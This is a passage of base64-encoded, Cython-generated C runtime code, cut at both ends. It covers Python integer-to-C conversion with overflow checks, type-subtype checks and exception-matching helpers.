FVSTl9JTlQoaW50LCB1bnNpZ25lZCBsb25nLCAoKCgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGludCkgPj0gNCAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAoKCgoKCgoKChpbnQpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIH0KICAgICAgICB9CiNlbmRpZgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBDMDBBNwogICAgICAgIGlmICh1bmxpa2VseShQeV9TSVpFKHgpIDwgMCkpIHsKICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7CiAgICAgICAgfQojZWxzZQogICAgICAgIHsKICAgICAgICAgICAgaW50IHJlc3VsdCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlQm9vbCh4LCBQeV9GYWxzZSwgUHlfTFQpOwogICAgICAgICAgICBpZiAodW5saWtlbHkocmVzdWx0IDwgMCkpCiAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgLTE7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShyZXN1bHQgPT0gMSkpCiAgICAgICAgICAgICAgICBnb3RvIHJhaXNlX25lZ19vdmVyZmxvdzsKICAgICAgICB9CiNlbmRpZgogICAgICAgIGlmICgoc2l6ZW9mKGludCkgPD0gc2l6ZW9mKHVuc2lnbmVkIGxvbmcpKSkgewogICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVF9FWEMoaW50LCB1bnNpZ25lZCBsb25nLCBQeUxvbmdfQXNVbnNpZ25lZExvbmcoeCkpCiNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgICAgIH0gZWxzZSBpZiAoKHNpemVvZihpbnQpIDw9IHNpemVvZih1bnNpZ25lZCBQWV9MT05HX0xPTkcpKSkgewogICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVF9FWEMoaW50LCB1bnNpZ25lZCBQWV9MT05HX0xPTkcsIFB5TG9uZ19Bc1Vuc2lnbmVkTG9uZ0xvbmcoeCkpCiNlbmRpZgogICAgICAgIH0KICAgIH0gZWxzZSB7CiNpZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFMKICAgICAgICBpZiAoX19QeXhfUHlMb25nX0lzQ29tcGFjdCh4KSkgewogICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIF9fUHl4X2NvbXBhY3RfcHlsb25nLCBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlKHgpKQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGNvbnN0IGRpZ2l0KiBkaWdpdHMgPSBfX1B5eF9QeUxvbmdfRGlnaXRzKHgpOwogICAgICAgICAgICBhc3NlcnQoX19QeXhfUHlMb25nX0RpZ2l0Q291bnQoeCkgPiAxKTsKICAgICAgICAgICAgc3dpdGNoIChfX1B5eF9QeUxvbmdfU2lnbmVkRGlnaXRDb3VudCh4KSkgewogICAgICAgICAgICAgICAgY2FzZSAtMjoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiAxICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQoaW50LCBsb25nLCAtKGxvbmcpICgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSkKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihpbnQpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgKCgoaW50KS0xKSooKCgoKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgMjoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSA+IDEgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZih1bnNpZ25lZCBsb25nKSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIHVuc2lnbmVkIGxvbmcsICgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSkKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihpbnQpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgKCgoKCgoaW50KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzBdKSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgY2FzZSAtMzoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAzICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQoaW50LCBsb25nLCAtKGxvbmcpICgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGludCkgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAoKChpbnQpLTEpKigoKCgoKChpbnQpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgMzoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZih1bnNpZ25lZCBsb25nKSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIHVuc2lnbmVkIGxvbmcsICgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGludCkgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAoKCgoKCgoKGludClkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzBdKSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgY2FzZSAtNDoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiAzICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiA0ICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQoaW50LCBsb25nLCAtKGxvbmcpICgoKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpICgoKGludCktMSkqKCgoKCgoKCgoaW50KWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1swXSkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgNDoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YoaW50KSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZih1bnNpZ25lZCBsb25nKSA+IDQgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChpbnQsIHVuc2lnbmVkIGxvbmcsICgoKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YoaW50KSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChpbnQpICgoKCgoKCgoKChpbnQpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGludClkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAoaW50KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChpbnQpZGlnaXRzWzBdKSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICB9CiAgICAgICAgfQojZW5kaWYKICAgICAgICBpZiAoKHNpemVvZihpbnQpIDw9IHNpemVvZihsb25nKSkpIHsKICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlRfRVhDKGludCwgbG9uZywgUHlMb25nX0FzTG9uZyh4KSkKI2lmZGVmIEhBVkVfTE9OR19MT05HCiAgICAgICAgfSBlbHNlIGlmICgoc2l6ZW9mKGludCkgPD0gc2l6ZW9mKFBZX0xPTkdfTE9ORykpKSB7CiAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UX0VYQyhpbnQsIFBZX0xPTkdfTE9ORywgUHlMb25nX0FzTG9uZ0xvbmcoeCkpCiNlbmRpZgogICAgICAgIH0KICAgIH0KICAgIHsKICAgICAgICBpbnQgdmFsOwogICAgICAgIGludCByZXQgPSAtMTsKI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTYgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgICAgICBQeV9zc2l6ZV90IGJ5dGVzX2NvcGllZCA9IFB5TG9uZ19Bc05hdGl2ZUJ5dGVzKAogICAgICAgICAgICB4LCAmdmFsLCBzaXplb2YodmFsKSwgUHlfQVNOQVRJVkVCWVRFU19OQVRJVkVfRU5ESUFOIHwgKGlzX3Vuc2lnbmVkID8gUHlfQVNOQVRJVkVCWVRFU19VTlNJR05FRF9CVUZGRVIgfCBQeV9BU05BVElWRUJZVEVTX1JFSkVDVF9ORUdBVElWRSA6IDApKTsKICAgICAgICBpZiAodW5saWtlbHkoYnl0ZXNfY29waWVkID09IC0xKSkgewogICAgICAgIH0gZWxzZSBpZiAodW5saWtlbHkoYnl0ZXNfY29waWVkID4gKFB5X3NzaXplX3QpIHNpemVvZih2YWwpKSkgewogICAgICAgICAgICBnb3RvIHJhaXNlX292ZXJmbG93OwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJldCA9IDA7CiAgICAgICAgfQojZWxpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwZDAwMDAgJiYgIShDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSkgfHwgZGVmaW5lZChfUHlMb25nX0FzQnl0ZUFycmF5KQogICAgICAgIGludCBvbmUgPSAxOyBpbnQgaXNfbGl0dGxlID0gKGludCkqKHVuc2lnbmVkIGNoYXIgKikmb25lOwogICAgICAgIHVuc2lnbmVkIGNoYXIgKmJ5dGVzID0gKHVuc2lnbmVkIGNoYXIgKikmdmFsOwogICAgICAgIHJldCA9IF9QeUxvbmdfQXNCeXRlQXJyYXkoKFB5TG9uZ09iamVjdCAqKXgsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ5dGVzLCBzaXplb2YodmFsKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaXNfbGl0dGxlLCAhaXNfdW5zaWduZWQpOwojZWxzZQogICAgICAgIFB5T2JqZWN0ICp2OwogICAgICAgIFB5T2JqZWN0ICpzdGVwdmFsID0gTlVMTCwgKm1hc2sgPSBOVUxMLCAqc2hpZnQgPSBOVUxMOwogICAgICAgIGludCBiaXRzLCByZW1haW5pbmdfYml0cywgaXNfbmVnYXRpdmUgPSAwOwogICAgICAgIGludCBjaHVua19zaXplID0gKHNpemVvZihsb25nKSA8IDgpID8gMzAgOiA2MjsKICAgICAgICBpZiAobGlrZWx5KFB5TG9uZ19DaGVja0V4YWN0KHgpKSkgewogICAgICAgICAgICB2ID0gX19QeXhfTmV3UmVmKHgpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHYgPSBQeU51bWJlcl9Mb25nKHgpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIXYpKSByZXR1cm4gKGludCkgLTE7CiAgICAgICAgICAgIGFzc2VydChQeUxvbmdfQ2hlY2tFeGFjdCh2KSk7CiAgICAgICAgfQogICAgICAgIHsKICAgICAgICAgICAgaW50IHJlc3VsdCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlQm9vbCh2LCBQeV9GYWxzZSwgUHlfTFQpOwogICAgICAgICAgICBpZiAodW5saWtlbHkocmVzdWx0IDwgMCkpIHsKICAgICAgICAgICAgICAgIFB5X0RFQ1JFRih2KTsKICAgICAgICAgICAgICAgIHJldHVybiAoaW50KSAtMTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpc19uZWdhdGl2ZSA9IHJlc3VsdCA9PSAxOwogICAgICAgIH0KICAgICAgICBpZiAoaXNfdW5zaWduZWQgJiYgdW5saWtlbHkoaXNfbmVnYXRpdmUpKSB7CiAgICAgICAgICAgIFB5X0RFQ1JFRih2KTsKICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7CiAgICAgICAgfSBlbHNlIGlmIChpc19uZWdhdGl2ZSkgewogICAgICAgICAgICBzdGVwdmFsID0gUHlOdW1iZXJfSW52ZXJ0KHYpOwogICAgICAgICAgICBQeV9ERUNSRUYodik7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghc3RlcHZhbCkpCiAgICAgICAgICAgICAgICByZXR1cm4gKGludCkgLTE7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgc3RlcHZhbCA9IHY7CiAgICAgICAgfQogICAgICAgIHYgPSBOVUxMOwogICAgICAgIHZhbCA9IChpbnQpIDA7CiAgICAgICAgbWFzayA9IFB5TG9uZ19Gcm9tTG9uZygoMUwgPDwgY2h1bmtfc2l6ZSkgLSAxKTsgaWYgKHVubGlrZWx5KCFtYXNrKSkgZ290byBkb25lOwogICAgICAgIHNoaWZ0ID0gUHlMb25nX0Zyb21Mb25nKGNodW5rX3NpemUpOyBpZiAodW5saWtlbHkoIXNoaWZ0KSkgZ290byBkb25lOwogICAgICAgIGZvciAoYml0cyA9IDA7IGJpdHMgPCAoaW50KSBzaXplb2YoaW50KSAqIDggLSBjaHVua19zaXplOyBiaXRzICs9IGNodW5rX3NpemUpIHsKICAgICAgICAgICAgUHlPYmplY3QgKnRtcCwgKmRpZ2l0OwogICAgICAgICAgICBsb25nIGlkaWdpdDsKICAgICAgICAgICAgZGlnaXQgPSBQeU51bWJlcl9BbmQoc3RlcHZhbCwgbWFzayk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghZGlnaXQpKSBnb3RvIGRvbmU7CiAgICAgICAgICAgIGlkaWdpdCA9IFB5TG9uZ19Bc0xvbmcoZGlnaXQpOwogICAgICAgICAgICBQeV9ERUNSRUYoZGlnaXQpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoaWRpZ2l0IDwgMCkpIGdvdG8gZG9uZTsKICAgICAgICAgICAgdmFsIHw9ICgoaW50KSBpZGlnaXQpIDw8IGJpdHM7CiAgICAgICAgICAgIHRtcCA9IFB5TnVtYmVyX1JzaGlmdChzdGVwdmFsLCBzaGlmdCk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghdG1wKSkgZ290byBkb25lOwogICAgICAgICAgICBQeV9ERUNSRUYoc3RlcHZhbCk7IHN0ZXB2YWwgPSB0bXA7CiAgICAgICAgfQogICAgICAgIFB5X0RFQ1JFRihzaGlmdCk7IHNoaWZ0ID0gTlVMTDsKICAgICAgICBQeV9ERUNSRUYobWFzayk7IG1hc2sgPSBOVUxMOwogICAgICAgIHsKICAgICAgICAgICAgbG9uZyBpZGlnaXQgPSBQeUxvbmdfQXNMb25nKHN0ZXB2YWwpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoaWRpZ2l0IDwgMCkpIGdvdG8gZG9uZTsKICAgICAgICAgICAgcmVtYWluaW5nX2JpdHMgPSAoKGludCkgc2l6ZW9mKGludCkgKiA4KSAtIGJpdHMgLSAoaXNfdW5zaWduZWQgPyAwIDogMSk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShpZGlnaXQgPj0gKDFMIDw8IHJlbWFpbmluZ19iaXRzKSkpCiAgICAgICAgICAgICAgICBnb3RvIHJhaXNlX292ZXJmbG93OwogICAgICAgICAgICB2YWwgfD0gKChpbnQpIGlkaWdpdCkgPDwgYml0czsKICAgICAgICB9CiAgICAgICAgaWYgKCFpc191bnNpZ25lZCkgewogICAgICAgICAgICBpZiAodW5saWtlbHkodmFsICYgKCgoaW50KSAxKSA8PCAoc2l6ZW9mKGludCkgKiA4IC0gMSkpKSkKICAgICAgICAgICAgICAgIGdvdG8gcmFpc2Vfb3ZlcmZsb3c7CiAgICAgICAgICAgIGlmIChpc19uZWdhdGl2ZSkKICAgICAgICAgICAgICAgIHZhbCA9IH52YWw7CiAgICAgICAgfQogICAgICAgIHJldCA9IDA7CiAgICBkb25lOgogICAgICAgIFB5X1hERUNSRUYoc2hpZnQpOwogICAgICAgIFB5X1hERUNSRUYobWFzayk7CiAgICAgICAgUHlfWERFQ1JFRihzdGVwdmFsKTsKI2VuZGlmCiAgICAgICAgaWYgKHVubGlrZWx5KHJldCkpCiAgICAgICAgICAgIHJldHVybiAoaW50KSAtMTsKICAgICAgICByZXR1cm4gdmFsOwogICAgfQpyYWlzZV9vdmVyZmxvdzoKICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19PdmVyZmxvd0Vycm9yLAogICAgICAgICJ2YWx1ZSB0b28gbGFyZ2UgdG8gY29udmVydCB0byBpbnQiKTsKICAgIHJldHVybiAoaW50KSAtMTsKcmFpc2VfbmVnX292ZXJmbG93OgogICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX092ZXJmbG93RXJyb3IsCiAgICAgICAgImNhbid0IGNvbnZlcnQgbmVnYXRpdmUgdmFsdWUgdG8gaW50Iik7CiAgICByZXR1cm4gKGludCkgLTE7Cn0KCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCnN0YXRpYyBpbnQgX19QeXhfSW5CYXNlcyhQeVR5cGVPYmplY3QgKmEsIFB5VHlwZU9iamVjdCAqYikgewogICAgd2hpbGUgKGEpIHsKICAgICAgICBhID0gX19QeXhfUHlUeXBlX0dldFNsb3QoYSwgdHBfYmFzZSwgUHlUeXBlT2JqZWN0Kik7CiAgICAgICAgaWYgKGEgPT0gYikKICAgICAgICAgICAgcmV0dXJuIDE7CiAgICB9CiAgICByZXR1cm4gYiA9PSAmUHlCYXNlT2JqZWN0X1R5cGU7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0lzU3VidHlwZShQeVR5cGVPYmplY3QgKmEsIFB5VHlwZU9iamVjdCAqYikgewogICAgUHlPYmplY3QgKm1ybzsKICAgIGlmIChhID09IGIpIHJldHVybiAxOwogICAgbXJvID0gYS0+dHBfbXJvOwogICAgaWYgKGxpa2VseShtcm8pKSB7CiAgICAgICAgUHlfc3NpemVfdCBpLCBuOwogICAgICAgIG4gPSBQeVR1cGxlX0dFVF9TSVpFKG1ybyk7CiAgICAgICAgZm9yIChpID0gMDsgaSA8IG47IGkrKykgewogICAgICAgICAgICBpZiAoUHlUdXBsZV9HRVRfSVRFTShtcm8sIGkpID09IChQeU9iamVjdCAqKWIpCiAgICAgICAgICAgICAgICByZXR1cm4gMTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIDA7CiAgICB9CiAgICByZXR1cm4gX19QeXhfSW5CYXNlcyhhLCBiKTsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfSXNBbnlTdWJ0eXBlMihQeVR5cGVPYmplY3QgKmNscywgUHlUeXBlT2JqZWN0ICphLCBQeVR5cGVPYmplY3QgKmIpIHsKICAgIFB5T2JqZWN0ICptcm87CiAgICBpZiAoY2xzID09IGEgfHwgY2xzID09IGIpIHJldHVybiAxOwogICAgbXJvID0gY2xzLT50cF9tcm87CiAgICBpZiAobGlrZWx5KG1ybykpIHsKICAgICAgICBQeV9zc2l6ZV90IGksIG47CiAgICAgICAgbiA9IFB5VHVwbGVfR0VUX1NJWkUobXJvKTsKICAgICAgICBmb3IgKGkgPSAwOyBpIDwgbjsgaSsrKSB7CiAgICAgICAgICAgIFB5T2JqZWN0ICpiYXNlID0gUHlUdXBsZV9HRVRfSVRFTShtcm8sIGkpOwogICAgICAgICAgICBpZiAoYmFzZSA9PSAoUHlPYmplY3QgKilhIHx8IGJhc2UgPT0gKFB5T2JqZWN0ICopYikKICAgICAgICAgICAgICAgIHJldHVybiAxOwogICAgICAgIH0KICAgICAgICByZXR1cm4gMDsKICAgIH0KICAgIHJldHVybiBfX1B5eF9JbkJhc2VzKGNscywgYSkgfHwgX19QeXhfSW5CYXNlcyhjbHMsIGIpOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9pbm5lcl9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMyKFB5T2JqZWN0ICplcnIsIFB5T2JqZWN0KiBleGNfdHlwZTEsIFB5T2JqZWN0ICpleGNfdHlwZTIpIHsKICAgIGlmIChleGNfdHlwZTEpIHsKICAgICAgICByZXR1cm4gX19QeXhfSXNBbnlTdWJ0eXBlMigoUHlUeXBlT2JqZWN0KillcnIsIChQeVR5cGVPYmplY3QqKWV4Y190eXBlMSwgKFB5VHlwZU9iamVjdCopZXhjX3R5cGUyKTsKICAgIH0gZWxzZSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X0lzU3VidHlwZSgoUHlUeXBlT2JqZWN0KillcnIsIChQeVR5cGVPYmplY3QqKWV4Y190eXBlMik7CiAgICB9Cn0Kc3RhdGljIGludCBfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXNUdXBsZShQeU9iamVjdCAqZXhjX3R5cGUsIFB5T2JqZWN0ICp0dXBsZSkgewogICAgUHlfc3NpemVfdCBpLCBuOwogICAgYXNzZXJ0KFB5RXhjZXB0aW9uQ2xhc3NfQ2hlY2soZXhjX3R5cGUpKTsKICAgIG4gPSBQeVR1cGxlX0dFVF9TSVpFKHR1cGxlKTsKICAgIGZvciAoaT0wOyBpPG47IGkrKykgewogICAgICAgIGlmIChleGNfdHlwZSA9PSBQeVR1cGxlX0dFVF9JVEVNKHR1cGxlLCBpKSkgcmV0dXJuIDE7CiAgICB9CiAgICBmb3IgKGk9MDsgaTxuOyBpKyspIHsKICAgICAgICBQeU9iamVjdCAqdCA9IFB5VHVwbGVfR0VUX0lURU0odHVwbGUsIGkpOwogICAgICAgIGlmIChsaWtlbHkoUHlFeGNlcHRpb25DbGFzc19DaGVjayh0KSkpIHsKICAgICAgICAgICAgaWYgKF9fUHl4X2lubmVyX1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlczIoZXhjX3R5cGUsIE5VTEwsIHQpKSByZXR1cm4gMTsKICAgICAgICB9IGVsc2UgewogICAgICAgIH0KICAgIH0KICAgIHJldHVybiAwOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoUHlPYmplY3QgKmVyciwgUHlPYmplY3QqIGV4Y190eXBlKSB7CiAgICBpZiAobGlrZWx5KGVyciA9PSBleGNfdHlwZSkpIHJldHVybiAxOwogICAgaWYgKGxpa2VseShQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKGVycikpKSB7CiAgICAgICAgaWYgKGxpa2VseShQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKGV4Y190eXBlKSkpIHsKICAgICAgICAgICAgcmV0dXJuIF9fUHl4X2lubmVyX1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlczIoZXJyLCBOVUxMLCBleGNfdHlwZSk7CiAgICAgICAgfSBlbHNlIGlmIChsaWtlbHkoUHlUdXBsZV9DaGVjayhleGNfdHlwZSkpKSB7CiAgICAgICAgICAgIHJldHVybiBfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXNUdXBsZShlcnIsIGV4Y190eXBlKTsKICAgICAgICB9IGVsc2UgewogICAgICAgIH0KICAgIH0KICAgIHJldHVybiBQeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXJyLCBleGNfdHlwZSk7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlczIoUHlPYmplY3QgKmVyciwgUHlPYmplY3QgKmV4Y190eXBlMSwgUHlPYmplY3QgKmV